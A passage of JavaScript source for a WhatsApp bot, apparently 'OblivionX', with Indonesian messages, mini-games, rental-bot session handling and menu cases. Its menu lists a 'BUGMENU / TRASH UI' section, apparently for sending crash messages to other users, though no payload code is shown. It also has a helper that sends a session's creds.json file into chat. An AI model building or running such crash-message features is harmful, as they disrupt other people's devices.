        if ((budy.match) && ["P", "p", ].includes(budy) && !isCmd) {
            if (budy.length === 1) {
                reply(`*Waalaikumsalam*`)
            } else {}
        }
        if ((budy.match) && ["Start", "mulai", "bot"].includes(budy) && !isCmd) {
            reply(`Silahlan Ketik .menu`)
        }
        if (!settingdb.public) {
            if (!m.key.fromMe && !isCreator) return
        }
        for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            let warnafk = `*\`[ Jangan tag dia! ]\`*

Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim()
            if (jid === m.sender) continue
            reply(warnafk)
        }
        if (global.db.data.users[m.sender].afkTime > -1) {
reply(`*\`\[ Afk User ]\`\*

Telah kembali Dari Afk ${userdb.afkReason ? ' Selama ' + userdb.afkReason : ''}
Selama ${clockString(new Date - userdb.afkTime)}
`.trim())
userdb.afkTime = -1
userdb.bits += 7
userdb.afkReason = ''
}

        let tebaklagu = db.data.game.tebaklagu = []
        let kuismath = db.data.game.kuismath = []
        let tebakgambar = db.data.game.tebakgambar = []
        let tebakkata = db.data.game.tebakkata = []
        let tebakkalimat = db.data.game.tebakkalimat = []
        let tebaklirik = db.data.game.tebaklirik = []
        let tebaktebakan = db.data.game.tebaktebakan = []
        let tebakbendera = db.data.game.tebakbendera = []
        let tebakbendera2 = db.data.game.tebakbendera2 = []
        let tebakkimia = db.data.game.tebakkimia = []
        let tebakasahotak = db.data.game.tebakasahotak = []
        let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
        let tebaksusunkata = db.data.game.tebaksusunkata = []
        let tebaktekateki = db.data.game.tebaktekateki = []
        let caklontong = db.data.game.lontong = []
        let caklontong_desk = db.data.game.lontong_desk = []
        let absenData = {}
        let vote = {}
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        
        zuu.menfes = zuu.menfes ? zuu.menfes : {}
        
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) { 
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'Game telah berakhir',
                    '-2': 'Invalid',
                    '-1': 'Posisi Invalid',
                    0: 'Posisi Invalid',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

*[ ${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`} ]*

❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
            if (room.x !== room.o) await zuu.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            await zuu.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        this.suit = this.suit ? this.suit : {}
        let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
        if (roof) {
            let win = ''
            let tie = false
            if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
                if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
                    zuu.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
                    delete this.suit[roof.id]
                    return !0
                }
                roof.status = 'play'
                roof.asal = from
                clearTimeout(roof.waktu)
                zuu.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di bot.`, m, {
                    mentions: [roof.p, roof.p2]
                })
                if (!roof.pilih) zuu.sendText(roof.p, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
                if (!roof.pilih2) zuu.sendText(roof.p2, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
                roof.waktu_milih = setTimeout(() => {
                    if (!roof.pilih && !roof.pilih2) zuu.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
                    else if (!roof.pilih || !roof.pilih2) {
                        win = !roof.pilih ? roof.p2 : roof.p
                        zuu.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
                    }
                    delete this.suit[roof.id]
                    return !0
                }, roof.timeout)
            }
            let jwb = m.sender == roof.p
            let jwb2 = m.sender == roof.p2
            let g = /gunting/i
            let b = /batu/i
            let k = /kertas/i
            let reg = /^(gunting|batu|kertas)/i
            if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
                roof.pilih = reg.exec(m.text.toLowerCase())[0]
                roof.text = m.text
                reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
                if (!roof.pilih2) zuu.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
            }
            if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
                roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
                roof.text2 = m.text
                reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
                if (!roof.pilih) zuu.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
            }
            let stage = roof.pilih
            let stage2 = roof.pilih2
            if (roof.pilih && roof.pilih2) {
                clearTimeout(roof.waktu_milih)
                if (b.test(stage) && g.test(stage2)) win = roof.p
                else if (b.test(stage) && k.test(stage2)) win = roof.p2
                else if (g.test(stage) && k.test(stage2)) win = roof.p
                else if (g.test(stage) && b.test(stage2)) win = roof.p2
                else if (k.test(stage) && b.test(stage2)) win = roof.p
                else if (k.test(stage) && g.test(stage2)) win = roof.p2
                else if (stage == stage2) tie = true
                zuu.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, {
                    mentions: [roof.p, roof.p2]
                })
                delete this.suit[roof.id]
            }
        }
        this.petakbom = this.petakbom ? this.petakbom : {}
        let pilih = "🌀",
            bomb = "💣";
        if (m.sender in this.petakbom) {
            if (!/^[1-9]$|^10$/i.test(body) || isCmd) return;
            const pos = parseInt(body) - 1;
            const gameData = this.petakbom[m.sender];
            const {
                petak,
                board,
                pick,
                nyawa,
                bomb,
                lolos
            } = gameData;
            if (petak[pos] === 1) return;
            if (petak[pos] === 2) {
                gameData.board[pos] = bomb;
                gameData.pick++;
                zuu.sendMessage(m.chat, {
                    react: {
                        text: '❌',
                        key: m.key
                    }
                });
                gameData.bomb--;
                gameData.nyawa.pop();

                if (gameData.nyawa.length < 1) {
                    await reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n${board.join("")}\n\n*Terpilih :* ${gameData.pick}\n*Pengurangan Bits :* -100`);
                    delete this.petakbom[m.sender];
                } else {
                    await reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n${board.join("")}\n\nTerpilih: ${gameData.pick}\nSisa nyawa: ${gameData.nyawa.join("")}`);
                }
                return;
            }
            if (petak[pos] === 0) {
                gameData.petak[pos] = 1;
                gameData.board[pos] = pilih;
                gameData.pick++;
                gameData.lolos--;
                if (gameData.lolos < 1) {
                    await reply(`\`*[ KAMU MENANG ]\`*\n\n${board.join("")}\n\n*Terpilih :* ${gameData.pick}\n*Sisa nyawa :* ${gameData.nyawa.join("")}\n*Bomb :* ${gameData.bomb}`);
                    userdb.petakbom = false
                    zuu.sendMessage(m.chat, {
                        react: {
                            text: '☑',
                            key: m.key
                        }
                    });
                    delete this.petakbom[m.sender];
                } else {
                    await reply(`*PILIH ANGKA*\n\n${board.join("")}\n\nTerpilih : ${gameData.pick}\nSisa nyawa : ${gameData.nyawa.join("")}\nBomb : ${gameData.bomb}`);
                }
                return;
            }
        }

        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
        }

        function Jadibotarchiv(userId) {
            zuu.sendMessage(m.chat, {
                document: fs.readFileSync('./lib/jadibot/session/${userId}/creds.json'),
                mimetype: 'application/json',
                fileName: 'creds.json'
            }, {
                quoted: fsaluran
            })
        }
    
        const jadibotJson1 = JSON.parse(fs.readFileSync('./lib/database/jadibot.json'));
        const sewa = JSON.parse(fs.readFileSync('./lib/database/sewa.json'));
        const _sewa = require('./lib/importe/sewa')
        const Jhdb = JSON.parse(fs.readFileSync('./lib/database/bot.json'));

        if (zuu.user.id === Jhdb.id) {
       _sewa.expiredCheck(zuu, sewa)
       _sewa.cekJadibot(jadibotJson1, zuu)
       }
       
        const letsrenew = () => {
            if (botNumber === botNumber) return;
            let timerrenew = userdb.lastclaimday + 86400000
            if (new Date - userdb.lastclaimday < 86400000) return reply(`Anda sudah merenew harian hari ini\ntunggu selama ${msToTime(timerrenew - new Date())} lagi`)
            addTimeJadibot(m.sender.replace("@s.whatsapp.net", ""), "25h")
            userdb.lastclaimday = new Date * 1
        }
        const givesessionBackup = (sender, type) => {
            if (type) {
               Jadibotarchiv(sender)
              _sewa.cekJadibot(jadibotJson1, sender, true)
            } else {
                letsrenew()
            }
        }
        const replyjdb = (id) => {
        let cekidjdb = toms(_sewa.getJadibotExpired(id, sewa) - Date.now());
    let jedenye = `*${X}[ JADIBOT EXPIRE ]${X}*\n\n*ID*: ${id}\n*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`;
        reply(jedenye)
        }
        const addTimeJadibot = (chatId, additionalHours) => {
            _sewa.addTimeJadibot(chatId, additionalHours, jadibotJson1) 
            replyjdb(chatId)
        };

        if (chatdb.mute && !isAdmins && !isCreator) {
            return
        }
        if (!m.isGroup && !isCreator && settingdb.onlygrub) {
            if (isCmd) {
                return;
            }
        }
        if (!isCreator && settingdb.onlypc && m.isGroup) {
            if (isCmd) {
                return;
            }
        }
        
                if (settingdb.autoTyping) {

        zuu.sendPresenceUpdate('composing', m.chat)


        }

        if (settingdb.autoRecording) {

        zuu.sendPresenceUpdate('recording', m.chat)

        }

        if (settingdb.autorecordtype) {
        let rcd2 = ['recording','composing']

        let rcd1 = rcd2[Math.floor(Math.random() * rcd2.length)]

        zuu.sendPresenceUpdate(rcd1, m.chat)

        }
        
        if (settingdb.autobio) {
            zuu.updateProfileStatus(`🍬 Hello I'm OblivionX, this my runtime : ${runtime(process.uptime())} `).catch(_ => _)
        }
        
        const isSewagc = _sewa.checkSewaGroup(m.chat, sewa)
        const isJadibot = _sewa.checkJadibotUser(m.sender, jadibotJson1)
        
      
        switch (command) {
            //=============[ MAIN - MENU ]=================//
            case "menu":
                const xtexg = `${resver}`

let buttons = [
        { buttonId: ".creator", buttonText: { displayText: "̋͢𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ᝄ" } },
        { buttonId: ".allmenu", buttonText: { displayText: "̋͢𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 ᝄ" } }, 
        { buttonId: ".tqto", buttonText: { displayText: "̋͢𝐃𝐄𝐂𝐒𝐑𝐈𝐏𝐓𝐈𝐎𝐍 𝐀𝐍𝐃 𝐓𝐐𝐓𝐎 ᝄ" } }
    ];
    
           let mbut = {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.jpegfile,
                    mimetype: 'image/jpg',
                    jpegThumbnail: fs.readFileSync("./assets/Gallery/doc4.jpg"),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl2,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: 101,
                            newsletterName: global.nems
                        },
                    },
                    caption: xtexg,
                    footer: nems,
                    buttons: buttons,
                    headerType: 6,
                    viewOnce: true
                };
                
        const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: `⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 𝐁𝐫𝐞𝐚𝐤𝐞𝐫𝐕𝐨𝐢𝐝 ᝄ \``,
                sections: [
                    {
       title: 'MENU ☇ SERBA GUNA', 
	   rows: [
      {
	          title: 'SEARCH ☇ MENU',    	
	          description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
    	      id: `${prefix}searchmenu`
             },
      {
              title: 'AI ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}aimenu`
             },   
      {
              title: 'TOOLS ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}toolsmenu`
             },
      {
              title: 'TEXTMAKER ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}textmaker`
             },
      {
              title: 'ISLAM ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}islammenu`
              },
      {
              title: 'DOWNLOAD ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}downloadmenu`
              },
      {
              title: 'STICKER ☇ MENU',
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
              id: `${prefix}stickermenu`
              }
          ]
      },
      {
      title: '𖥂 BUGMENU ᝄ TRASH UI',            
      rows: [
      {
              title: 'BUG ☇ MENU',            
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,        
              id: `${prefix}xoutplace`
              },
      {
              title: 'BUG ☇ MENU IN PLACE',            
              description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,        
              id: `${prefix}xinplace`
              }
          ]
      },
      {
      title: '𖥂 MENU ᝄ FUN/GAME/18+',            
      rows: [ 
      {
             title: 'VOICE ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}voicemenu`
             },
      {
             title: 'SOUND ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}soundmenu`
             },
      {
             title: 'RPG ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}gamemenu`
             },
      {
             title: 'FUN ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}funmenu`
             },
      {
             title: 'NSFW ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}nsfwmenu`
             },
          ]
      },  
      {
      title: '𖥂 MENU ᝄ JB & GROUP & PANEL',            
      rows: [
      {
             title: 'PUSHCNTK ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}pushkontakmenu`
             }, 
      {
             title: 'GROUP ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}groupmenu`
             },
      {
             title: 'CREATE ☇ PANEL',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}panelmenu`
             },
      {
             title: 'DO ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}domenu`
             },
      {
             title: 'LINODE ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}linodemenu`
             },
      {
             title: 'JADIBOT ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}jadibotmenu`
             },
      {
             title: 'ABSEN GC ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}absenmenu`
             },
      {
             title: 'DEBUG ☇ MENU',
             description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
             id: `${prefix}debugmenu`
             },
      {
		    title: 'OWNER ☇ MENU', 
		    description: `ᝄ 츈ᝄ꾱ᝄ令ᝄ붯ᝄ`,
		    id: `${prefix}ownermenu`
	        }
	    ]
    }
                ]
            })
        },
        viewOnce: true
    };

    mbut.buttons.push(flowActions);
    
    await zuu.sendMessage(m.chat, mbut, { quoted: fsaluran });       
                break

            case "alloblivionx":
            case "allmenu":
            case "menuall": {
                const tek = `${resver}

${global.allmenu}`
                zuu.sendMessage(m.chat, {
                    text: tek,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
     case "tqto": {
                
                zuu.sendMessage(m.chat, {
                    text: `ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴꜱ ᴛᴏ ᴛʜᴏꜱᴇ ᴡʜᴏ ʜᴀᴠᴇ ʜᴇʟᴘᴇᴅ ᴍᴇ ᴛᴏ ᴅᴇᴠᴇʟᴏᴘ ᴛʜɪꜱ ꜱᴄʀɪᴘᴛ

> 𝚉𝚄𝚄𝙽𝙾𝚃𝙵𝙾𝚄𝙽𝙳
> 𝚂𝚆𝙸𝙿𝙴𝚁
> ᴍʏ ꜱᴇʟꜰ
> ᴀʟʟ ᴏꜰ ʏᴏᴜ

— ᴘᴀʀᴛɪᴄɪᴘᴀᴛɪɴɢ ᴛᴇᴀᴍꜱ
> 𝙳𝙶 - 𝙳𝙰𝚁𝙺𝙰𝙽𝙶𝙴𝙻

ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ ᴋɪᴛᴀ ʙɪᴀʀ ꜱᴇᴍᴀɴɢᴀᴛ ꜱᴀᴍᴀ ᴅᴀᴘᴇᴛ ᴜᴘᴅᴇᴛᴀɴ ꜱᴄʀɪᴘᴛ ꜱᴇʟᴀɴᴊᴜᴛɴʏᴀ

 https://whatsapp.com/channel/0029VbACugX6rsQyHw0Wvr1g

> ᴡɪᴛʜᴏᴜᴛ ᴛʜᴇᴍ, ᴛʜɪꜱ ꜱᴄʀɪᴘᴛ ɪꜱ ɴᴏᴛʜɪɴɢ :)`,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl2,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: 101,
                            newsletterName: global.nems
                        },
                    }
                }, {})
            }
            break
       //=============[ allmenu nya males bet babi ]=================//
     case "ownermenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.ownermenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "jadibotmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.jadibotmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "xinplace": {
                
                zuu.sendMessage(m.chat, {
                    text: globat.xinplace,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "funmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.funmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
            case "nsfwmenu": {
            
                zuu.sendMessage(m.chat, {
                    text: global.nsfwmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
          break
     case "gamemenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.gamemenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "domenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.domenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "linodemenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.linodemenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "soundmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.soundmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "stickermenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.stickermenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "toolsmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.toolsmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "panelmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.panelmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "textmaker": {
                
                zuu.sendMessage(m.chat, {
                    text: global.textmaker,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "searchmenu": {  
                 
                zuu.sendMessage(m.chat, {
                    text: global.searchmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "debugmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.debugmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "voicemenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.voicemenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "downloadmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.downloadmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
      case "islammenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.islammenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
